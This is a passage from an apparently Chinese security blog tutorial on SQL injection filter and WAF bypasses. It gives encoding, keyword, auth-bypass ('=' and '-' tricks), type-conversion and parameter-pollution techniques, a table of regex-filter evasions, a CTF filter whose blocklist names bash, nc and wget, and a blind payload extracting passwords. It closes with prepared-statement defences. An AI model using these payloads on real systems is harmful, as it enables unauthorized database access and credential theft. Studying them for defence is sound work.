+<figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">SELECT</span> <span class="keyword">DISTINCT</span>(db) <span class="keyword">FROM</span> mysql.db <span class="keyword">WHERE</span> <span class="string">`Host`</span>=<span class="string">'localhost'</span> <span class="keyword">and</span>-++<span class="number">-1</span>=<span class="number">1</span>;需要偶数个<span class="comment">--</span></div><div class="line"></div><div class="line"><span class="keyword">SELECT</span> <span class="keyword">DISTINCT</span>(db) <span class="keyword">FROM</span> mysql.db <span class="keyword">WHERE</span> <span class="string">`Host`</span>=<span class="string">'localhost'</span> <span class="keyword">and</span>!!~~~~!<span class="number">1</span>=<span class="number">1</span>;需要奇数个！</div></pre></td></tr></table></figure>
+<p>其实一下的字符都可以测试</p>
+<table>
+<thead>
+<tr>
+<th>字符</th>
+<th>释意</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>20</td>
+<td>Space</td>
+</tr>
+<tr>
+<td>2B</td>
+<td>+</td>
+</tr>
+<tr>
+<td>2D</td>
+<td>-</td>
+</tr>
+<tr>
+<td>7E</td>
+<td>~</td>
+</tr>
+<tr>
+<td>21</td>
+<td>!</td>
+</tr>
+<tr>
+<td>40</td>
+<td>@</td>
+</tr>
+</tbody>
+</table>
+<h3 id="注释符amp引号">注释符&amp;引号</h3>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">SELECT</span> <span class="keyword">DISTINCT</span>(db) <span class="keyword">FROM</span> mysql.db <span class="keyword">WHERE</span> <span class="string">`Host`</span>=<span class="string">'localhost'</span> <span class="keyword">and</span><span class="comment">/**/</span><span class="number">1</span>=<span class="number">1</span>;</div><div class="line"><span class="keyword">SELECT</span> <span class="keyword">DISTINCT</span>(db) <span class="keyword">FROM</span> mysql.db <span class="keyword">WHERE</span> <span class="string">`Host`</span>=<span class="string">'localhost'</span> <span class="keyword">and</span><span class="string">"1=1"</span>;</div></pre></td></tr></table></figure>
+<h2 id="编码绕过">编码绕过</h2>
+<table>
+<thead>
+<tr>
+<th>column</th>
+<th>column</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>URL Encoding</td>
+<td>SELECT %74able_%6eame FROM information_schema.tables;</td>
+</tr>
+<tr>
+<td>Double URL Encoding</td>
+<td>SELECT %2574able_%256eame FROM information_schema.tables;</td>
+</tr>
+<tr>
+<td>Unicode Encoding</td>
+<td>SELECT %u0074able_%u6eame FROM information_schema.tables;</td>
+</tr>
+</tbody>
+</table>
+<h2 id="关键字绕过">关键字绕过</h2>
+<p>测试用例<code>information_schema.tables</code></p>
+<table>
+<thead>
+<tr>
+<th>column</th>
+<th>column</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>空格</td>
+<td>information_schema . tables</td>
+</tr>
+<tr>
+<td>反引号</td>
+<td>`information_schema`.`tables`</td>
+</tr>
+<tr>
+<td>特殊符</td>
+<td>/*!information_schema.tables*/</td>
+</tr>
+<tr>
+<td>别名</td>
+<td>information_schema.partitions,statistics,key_column_usage,table_constraints</td>
+</tr>
+</tbody>
+</table>
+<h2 id="认证绕过">认证绕过</h2>
+<p>绕过语句：’=’</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">select</span> <span class="keyword">data</span> <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">where</span> <span class="keyword">name</span>=<span class="string">"="</span></div><div class="line"><span class="keyword">select</span> <span class="keyword">data</span> <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">where</span> flase=<span class="string">"</span></div><div class="line">select data from users where 0=0</div></pre></td></tr></table></figure>
+<p>绕过语句：’-’</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">select</span> <span class="keyword">data</span> <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">where</span> <span class="keyword">name</span>=<span class="string">''</span>-<span class="string">''</span></div><div class="line"><span class="keyword">select</span> <span class="keyword">data</span> <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">where</span> <span class="keyword">name</span>=<span class="number">0</span><span class="number">-0</span></div><div class="line"><span class="keyword">select</span> <span class="keyword">data</span> <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">where</span> <span class="number">0</span>=<span class="number">0</span></div></pre></td></tr></table></figure>
+<p>比如登录的时候需要输入email和passwd，可以这样输入</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">email=''&amp;password=''</div></pre></td></tr></table></figure>
+<h2 id="类型转换">类型转换</h2>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">' or 1=true</div><div class="line">' or 1</div><div class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">where</span> <span class="string">'a'</span>=<span class="string">'b'</span>=<span class="string">'c'</span></div><div class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">where</span> (<span class="string">'a'</span>=<span class="string">'b'</span>)=<span class="string">'c'</span></div><div class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">where</span> (<span class="literal">false</span>)=<span class="string">'c'</span></div><div class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">where</span> (<span class="number">0</span>)=<span class="string">'c'</span></div><div class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">where</span> (<span class="number">0</span>)=<span class="number">0</span></div><div class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">where</span> <span class="literal">true</span></div><div class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">users</span></div></pre></td></tr></table></figure>
+<p>我们还有关于此的漏洞，就以一次CTF的题目来说(源码如下)：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">fiter</span></span>&#123;</div><div class="line">    <span class="keyword">var</span> $str;</div><div class="line">    <span class="keyword">var</span> $order;</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">function</span> <span class="title">sql_clean</span><span class="params">($str)</span></span>&#123;</div><div class="line">        <span class="keyword">if</span>(is_array($str))&#123;</div><div class="line">            <span class="keyword">echo</span> <span class="string">"&lt;script&gt; alert('not array!!@_@');parent.location.href='index.php'; &lt;/script&gt;"</span>;<span class="keyword">exit</span>;</div><div class="line">        &#125;</div><div class="line">        $filter = <span class="string">"/ |\*|#|,|union|like|regexp|for|and|or|file|--|\||`|&amp;|"</span>.urldecode(<span class="string">'%09'</span>).<span class="string">"|"</span>.urldecode(<span class="string">"%0a"</span>).<span class="string">"|"</span>.urldecode(<span class="string">"%0b"</span>).<span class="string">"|"</span>.urldecode(<span class="string">'%0c'</span>).<span class="string">"|"</span>.urldecode(<span class="string">'%0d'</span>).<span class="string">"/i"</span>;</div><div class="line">        <span class="keyword">if</span>(preg_match($filter,$str))&#123;</div><div class="line">            <span class="keyword">echo</span> <span class="string">"&lt;script&gt; alert('illegal character!!@_@');parent.location.href='index.php'; &lt;/script&gt;"</span>;<span class="keyword">exit</span>;</div><div class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span>(strrpos($str,urldecode(<span class="string">"%00"</span>)))&#123;</div><div class="line">            <span class="keyword">echo</span> <span class="string">"&lt;script&gt; alert('illegal character!!@_@');parent.location.href='index.php'; &lt;/script&gt;"</span>;<span class="keyword">exit</span>;</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;str=$str;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">function</span> <span class="title">ord_clean</span><span class="params">($ord)</span></span>&#123;</div><div class="line">        $filter = <span class="string">" |bash|perl|nc|java|php|&gt;|&gt;&gt;|wget|ftp|python|sh"</span>;</div><div class="line">        <span class="keyword">if</span> (preg_match(<span class="string">"/"</span>.$filter.<span class="string">"/i"</span>,$ord) == <span class="number">1</span>)&#123;</div><div class="line">            <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;order = <span class="string">""</span>;</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;order = $ord;</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>这里过滤了很多关键词了，需要用到类型转换了，这里我们用+号</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">Payload如下：</div><div class="line">uname=aa<span class="string">'+(ascii(mid((passwd)from(1)))&gt;0)+'</span>1</div><div class="line">执行的SQL语句如下：</div><div class="line">xxxxxx <span class="built_in">where</span> username = <span class="string">'aa'</span>+(ascii(mid((passwd)from(users)))&gt;0)+<span class="string">'1'</span></div><div class="line">这样就可以开始写脚本跑数据了</div></pre></td></tr></table></figure>
+<p>除了＋号，其他算术操作符号也会发生类型的类型转换，例如MOD，DIV，＊，／，％，－，<br>
+关于隐式类型转换的文章可以看<a href="http://www.freebuf.com/articles/web/8773.html" target="_blank" rel="external">这里</a></p>
+<h2 id="http参数污染">HTTP参数污染</h2>
+<p>当我们传入的参数为</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://sqlinjection.com/?par1=val1&amp;par1=val2</div></pre></td></tr></table></figure>
+<p>进入到不同的Web Server就可能得到不同的结果，这里借鉴一下国外大佬一篇文章的总结，如下：</p>
+<table>
+<thead>
+<tr>
+<th>Web Server</th>
+<th>Parameter Interpretation</th>
+<th>Example</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><a href="http://ASP.NET/IIS" target="_blank" rel="external">ASP.NET/IIS</a></td>
+<td>Concatenation by comma</td>
+<td>par1=val1,val2</td>
+</tr>
+<tr>
+<td>ASP/IIS</td>
+<td>Concatenation by comma</td>
+<td>par1=val1,val2</td>
+</tr>
+<tr>
+<td>PHP/Apache</td>
+<td>The last param is resulting</td>
+<td>par1=val2</td>
+</tr>
+<tr>
+<td>JSP/Tomcat</td>
+<td>The first param is resulting</td>
+<td>par1=val1</td>
+</tr>
+<tr>
+<td>Perl/Apache</td>
+<td>The first param is resulting</td>
+<td>par1=val1</td>
+</tr>
+<tr>
+<td>DBMan</td>
+<td>Concatenation by two tildes</td>
+<td>par1=val1~~val2</td>
+</tr>
+</tbody>
+</table>
+<p>不同的web server的处理结果截然不同</p>
+<p>| Query String	  |Apache/2.2.16, PHP/5.3.3 | IIS6/ASP	    |<br>
+|------------------|-----------------------------------------|<br>
+| ?test[1=2	  | test_1=2	 	     | test[1=2	    |<br>
+| ?test=%  	  | test=%		     | test=	    |<br>
+| ?test%00=1	  | test=1	       	     | test=1	    |<br>
+| ?test=1%001	  | NULL		     | test=1	    |<br>
+| ?test+d=1+2	  | test_d=1 2		     | test d=1 2   |</p>
+<p>这里也推荐一篇国外的<a href="http://www.blackhat.com/presentations/bh-usa-09/DZULFAKAR/BHUSA09-Dzulfakar-MySQLExploit-SLIDES.pdf" target="_blank" rel="external">文章</a></p>
+<h1 id="实战正则过滤绕过">实战正则过滤绕过</h1>
+<table>
+<thead>
+<tr>
+<th>过滤字符</th>
+<th>PHP正则代码</th>
+<th>原查询语句</th>
+<th>现查询语句</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>and, or</td>
+<td>preg_match(’/(and|or)/i’, $id)</td>
+<td>1 or 1 = 1,1 and 1 = 1</td>
+<td>1 || 1 = 1,	1 &amp;&amp; 1 = 1</td>
+</tr>
+<tr>
+<td>and, or, union</td>
+<td>preg_match(’/(and|or|union)/i’, $id)</td>
+<td>union select user, password from users</td>
+<td>1 || (select user from users where user_id = 1) = ‘admin’</td>
+</tr>
+<tr>
+<td>and, or, union, where</td>
+<td>preg_match(’/(and|or|union|where)/i’, $id)</td>
+<td>1 || (select user from users where user_id = 1) = ‘admin’</td>
+<td>1 || (select user from users limit 1) = ‘admin’</td>
+</tr>
+<tr>
+<td>and, or, union, where, limit</td>
+<td>preg_match(’/(and|or|union|where|limit)/i’, $id)</td>
+<td>1 || (select user from users limit 1) = ‘admin’</td>
+<td>1 || (select user from users group by user_id having user_id = 1) = ‘admin’</td>
+</tr>
+<tr>
+<td>and, or, union, where, limit, group by</td>
+<td>preg_match(’/(and|or|union|where|limit|group by)/i’, $id)</td>
+<td>1 || (select user from users group by user_id having user_id = 1) = ‘admin’</td>
+<td>1 || (select substr(gruop_concat(user_id),1,1) user from users ) = 1</td>
+</tr>
+<tr>
+<td>and, or, union, where, limit, group by, select</td>
+<td>preg_match(’/(and|or|union|where|limit|group by|select)/i’, $id)</td>
+<td>1 || (select substr(gruop_concat(user_id),1,1) user from users) = 1</td>
+<td>1 || 1 = 1 into outfile ‘result.txt’ <br>1 || substr(user,1,1) = ‘a’</td>
+</tr>
+<tr>
+<td>and, or, union, where, limit, group by, select, ’</td>
+<td>preg_match(’/(and|or|union|where|limit|group by|select|’)/i’, $id)</td>
+<td>1 || (select substr(gruop_concat(user_id),1,1) user from users) = 1</td>
+<td>1 || user_id is not null<br>1 || substr(user,1,1) = 0x61<br>1 || substr(user,1,1) = unhex(61)</td>
+</tr>
+<tr>
+<td>and, or, union, where, limit, group by, select, ', hex</td>
+<td>preg_match(’/(and|or|union|where|limit|group by|select|’|hex)/i’, $id)</td>
+<td>1 || substr(user,1,1) = unhex(61)</td>
+<td>1 || substr(user,1,1) = lower(conv(11,10,36))</td>
+</tr>
+<tr>
+<td>and, or, union, where, limit, group by, select, ', hex, substr</td>
+<td>preg_match(’/(and|or|union|where|limit|group by|select|’|hex|substr)/i’, $id)</td>
+<td>1 || substr(user,1,1) = lower(conv(11,10,36))</td>
+<td>1 || lpad(user,7,1)</td>
+</tr>
+<tr>
+<td>and, or, union, where, limit, group by, select, ', hex, substr, white space</td>
+<td>preg_match(’/(and|or|union|where|limit|group by|select|’|hex|substr|\s)/i’, $id)</td>
+<td>1 || lpad(user,7,1)</td>
+<td>1%0b||%0blpad(user,7,1)</td>
+</tr>
+</tbody>
+</table>
+<h1 id="防御手段代码以php为例">防御手段(代码以PHP为例)</h1>
+<p>像WAF之类防御手段自己无能为力经常打补丁就好，这里主要提一下代码层面的问题<br>
+推荐使用下面的方式进行查询：</p>
+<h2 id="mysqli">MYSQLi</h2>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">$stmt = $db-&gt;prepare(<span class="string">'update name set name = ? where id = ?'</span>);</div><div class="line">$stmt-&gt;bind_param(<span class="string">'si'</span>,$name,$id);</div><div class="line">$stmt-&gt;execute();</div></pre></td></tr></table></figure>
+<h2 id="odbc">ODBC</h2>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">$stmt = odbc_prepare( $conn, <span class="string">'SELECT * FROM users WHERE email = ?'</span> );</div><div class="line">$success = odbc_execute( $stmt, <span class="keyword">array</span>($email) );</div></pre></td></tr></table></figure>
+<p>或者</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">$dbh = odbc_exec($conn, <span class="string">'SELECT * FROM users WHERE email = ?'</span>, <span class="keyword">array</span>($email));</div><div class="line">$sth = $dbh-&gt;prepare(<span class="string">'SELECT * FROM users WHERE email = :email'</span>);</div><div class="line">$sth-&gt;execute(<span class="keyword">array</span>(<span class="string">':email'</span> =&gt; $email));</div></pre></td></tr></table></figure>
+<h2 id="pdo">PDO</h2>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">$dbh = <span class="keyword">new</span> PDO(<span class="string">'mysql:dbname=testdb;host=127.0.0.1'</span>, $user, $password);</div><div class="line">$stmt = $dbh-&gt;prepare(<span class="string">'INSERT INTO REGISTRY (name, value) VALUES (:name, :value)'</span>);</div><div class="line">$stmt-&gt;bindParam(<span class="string">':name'</span>, $name);</div><div class="line">$stmt-&gt;bindParam(<span class="string">':value'</span>, $value);</div><div class="line"></div><div class="line"><span class="comment">// insert one row</span></div><div class="line">$name = <span class="string">'one'</span>;</div><div class="line">$value = <span class="number">1</span>;</div><div class="line">$stmt-&gt;execute();</div></pre></td></tr></table></figure>
+<p>或者</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">$dbh = <span class="keyword">new</span> PDO(<span class="string">'mysql:dbname=testdb;host=127.0.0.1'</span>, $user, $password);</div><div class="line">$stmt = $dbh-&gt;prepare(<span class="string">'UPDATE people SET name = :new_name WHERE id = :id'</span>);</div><div class="line">$stmt-&gt;execute( <span class="keyword">array</span>(<span class="string">'new_name'</span> =&gt; $name, <span class="string">'id'</span> =&gt; $id) );</div></pre></td></tr></table></figure>
+<h2 id="框架">框架</h2>
+<p>对于框架的话只要遵循框架的API就好，例如wp的查询</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">global</span> $wpdb;</div><div class="line">$wpdb-&gt;query(</div><div class="line">    $wpdb-&gt;prepare( <span class="string">'SELECT name FROM people WHERE id = %d OR email = %s'</span>,</div><div class="line">        $person_id, $person_email</div><div class="line">    )</div><div class="line">);</div><div class="line">或者</div><div class="line"><span class="keyword">global</span> $wpdb;</div><div class="line">$wpdb-&gt;insert( <span class="string">'people'</span>,</div><div class="line">        <span class="keyword">array</span>(</div><div class="line">            <span class="string">'person_id'</span> =&gt; <span class="string">'123'</span>,</div><div class="line">            <span class="string">'person_email'</span> =&gt; <span class="string">'bobby@tables.com'</span></div><div class="line">        ),</div><div class="line">    <span class="keyword">array</span>( <span class="string">'%d'</span>, <span class="string">'%s'</span> )</div><div class="line">);</div></pre></td></tr></table></figure>
+<h1 id="参考">参考</h1>
+<p>这篇文章主要是做一个总结，有的点可能描述的不是很细致，可以自己再深入研究</p>
+<ul>
+<li><a href="https://www.defcon.org/images/defcon-17/dc-17-presentations/defcon-17-joseph_mccray-adv_sql_injection.pdf" target="_blank" rel="external">https://www.defcon.org/images/defcon-17/dc-17-presentations/defcon-17-joseph_mccray-adv_sql_injection.pdf</a></li>
+<li><a href="https://www.ptsecurity.com/upload/corporate/ww-en/download/PT-devteev-CC-WAF-ENG.pdf" target="_blank" rel="external">https://www.ptsecurity.com/upload/corporate/ww-en/download/PT-devteev-CC-WAF-ENG.pdf</a></li>
+<li><a href="https://media.blackhat.com/bh-us-12/Briefings/Ristic/BH_US_12_Ristic_Protocol_Level_Slides.pdf" target="_blank" rel="external">https://media.blackhat.com/bh-us-12/Briefings/Ristic/BH_US_12_Ristic_Protocol_Level_Slides.pdf</a></li>
+<li><a href="https://www.exploit-db.com/papers/17934/" target="_blank" rel="external">https://www.exploit-db.com/papers/17934/</a></li>
+<li><a href="http://wooyun.jozxing.cc/static/drops/tips-7299.html" target="_blank" rel="external">http://wooyun.jozxing.cc/static/drops/tips-7299.html</a></li>
+<li><a href="http://www.cnblogs.com/helingfeng/p/6486854.html" target="_blank" rel="external">http://www.cnblogs.com/helingfeng/p/6486854.html</a></li>
+<li><a href="http://voice0fblackhat.blogspot.com/2012/01/tut-waf-bypassing-tut-sharing.html" target="_blank" rel="external">http://voice0fblackhat.blogspot.com/2012/01/tut-waf-bypassing-tut-sharing.html</a></li>
+</ul>
+
+                
+
+                <hr>
+                <!-- Pager -->
+                <ul class="pager">
+                    
+                        <li class="previous">
+                            <a href="/2017/05/29/xxe/" data-toggle="tooltip" data-placement="top" title="XXE">&larr; Previous Post</a>
+                        </li>
+                    
+                    
+                        <li class="next">
+                            <a href="/2017/04/09/Mysql_oob/" data-toggle="tooltip" data-placement="top" title="Out of band injection">Next Post &rarr;</a>
+                        </li>
+                    
+                </ul>
+
+                <!-- duoshuo Share start -->
+                
+                <!-- 多说 Share end-->
+
+                <!-- 多说评论框 start -->
+                
+                <!-- 多说评论框 end -->
+
+                <!-- disqus comment start -->
+                
+                    <div class="comment">
+                        <div id="disqus_thread" class="disqus-thread"></div>
+                    </div>
+                
+                <!-- disqus comment end -->
+            </div>
+            
+            <!-- Tabe of Content -->
+            <!-- Table of Contents -->
+
+    
+      <aside id="sidebar">
+        <div id="toc" class="toc-article">
+        <strong class="toc-title">Contents</strong>
+        
+          <ol class="toc-nav"><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link" href="#注入常用函数与字符"><span class="toc-nav-number">1.</span> <span class="toc-nav-text">注入常用函数与字符</span></a></li><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link" href="#测试注入"><span class="toc-nav-number">2.</span> <span class="toc-nav-text">测试注入</span></a></li><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link" href="#注释符"><span class="toc-nav-number">3.</span> <span class="toc-nav-text">注释符</span></a></li><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link" href="#版本amp主机名amp用户amp库名"><span class="toc-nav-number">4.</span> <span class="toc-nav-text">版本&主机名&用户&库名</span></a></li><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link" href="#表和字段"><span class="toc-nav-number">5.</span> <span class="toc-nav-text">表和字段</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#确定字段数"><span class="toc-nav-number">5.1.</span> <span class="toc-nav-text">确定字段数</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#order-by"><span class="toc-nav-number">5.1.1.</span> <span class="toc-nav-text">ORDER BY</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#select-into"><span class="toc-nav-number">5.1.2.</span> <span class="toc-nav-text">SELECT … INTO</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#判断已知表名的字段数"><span class="toc-nav-number">5.1.3.</span> <span class="toc-nav-text">判断已知表名的字段数</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#查表名"><span class="toc-nav-number">5.2.</span> <span class="toc-nav-text">查表名</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#查列名"><span class="toc-nav-number">5.3.</span> <span class="toc-nav-text">查列名</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link" href="#字符串连接"><span class="toc-nav-number">6.</span> <span class="toc-nav-text">字符串连接</span></a></li><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link" href="#条件语句amp时间函数"><span class="toc-nav-number">7.</span> <span class="toc-nav-text">条件语句&时间函数</span></a></li><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link" href="#文件操作"><span class="toc-nav-number">8.</span> <span class="toc-nav-text">文件操作</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#文件操作权限"><span class="toc-nav-number">8.1.</span> <span class="toc-nav-text">文件操作权限</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#读文件"><span class="toc-nav-number">8.2.</span> <span class="toc-nav-text">读文件</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#写文件"><span class="toc-nav-number">8.3.</span> <span class="toc-nav-text">写文件</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link" href="#带外通道"><span class="toc-nav-number">9.</span> <span class="toc-nav-text">带外通道</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#什么是带外通道注入"><span class="toc-nav-number">9.1.</span> <span class="toc-nav-text">什么是带外通道注入？</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#条件限制"><span class="toc-nav-number">9.2.</span> <span class="toc-nav-text">条件限制</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#dns注入"><span class="toc-nav-number">9.3.</span> <span class="toc-nav-text">DNS注入</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#smb-relay-注入攻击"><span class="toc-nav-number">9.4.</span> <span class="toc-nav-text">SMB Relay 注入攻击</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#what-is-smb-relay"><span class="toc-nav-number">9.4.1.</span> <span class="toc-nav-text">What is SMB relay</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#攻击流程"><span class="toc-nav-number">9.4.2.</span> <span class="toc-nav-text">攻击流程</span></a></li></ol></li></ol></li><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link" href="#绕过技巧"><span class="toc-nav-number">10.</span> <span class="toc-nav-text">绕过技巧</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#绕过单引号"><span class="toc-nav-number">10.1.</span> <span class="toc-nav-text">绕过单引号</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#大小写绕过"><span class="toc-nav-number">10.2.</span> <span class="toc-nav-text">大小写绕过</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#替换绕过"><span class="toc-nav-number">10.3.</span> <span class="toc-nav-text">替换绕过</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#注释绕过"><span class="toc-nav-number">10.4.</span> <span class="toc-nav-text">注释绕过</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#特殊嵌入绕过"><span class="toc-nav-number">10.5.</span> <span class="toc-nav-text">特殊嵌入绕过</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#宽字节注入"><span class="toc-nav-number">10.6.</span> <span class="toc-nav-text">宽字节注入</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#mysql版本号字符"><span class="toc-nav-number">10.7.</span> <span class="toc-nav-text">MySQL版本号字符</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#字符编码绕过"><span class="toc-nav-number">10.8.</span> <span class="toc-nav-text">字符编码绕过</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#绕空格"><span class="toc-nav-number">10.9.</span> <span class="toc-nav-text">绕空格</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#特殊字符绕过空格"><span class="toc-nav-number">10.9.1.</span> <span class="toc-nav-text">特殊字符绕过空格</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#括号绕过空格"><span class="toc-nav-number">10.9.2.</span> <span class="toc-nav-text">括号绕过空格</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#andor后插入字符绕过空格"><span class="toc-nav-number">10.9.3.</span> <span class="toc-nav-text">and/or后插入字符绕过空格</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#注释符amp引号"><span class="toc-nav-number">10.9.4.</span> <span class="toc-nav-text">注释符&引号</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#编码绕过"><span class="toc-nav-number">10.10.</span> <span class="toc-nav-text">编码绕过</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#关键字绕过"><span class="toc-nav-number">10.11.</span> <span class="toc-nav-text">关键字绕过</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#认证绕过"><span class="toc-nav-number">10.12.</span> <span class="toc-nav-text">认证绕过</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#类型转换"><span class="toc-nav-number">10.13.</span> <span class="toc-nav-text">类型转换</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#http参数污染"><span class="toc-nav-number">10.14.</span> <span class="toc-nav-text">HTTP参数污染</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link" 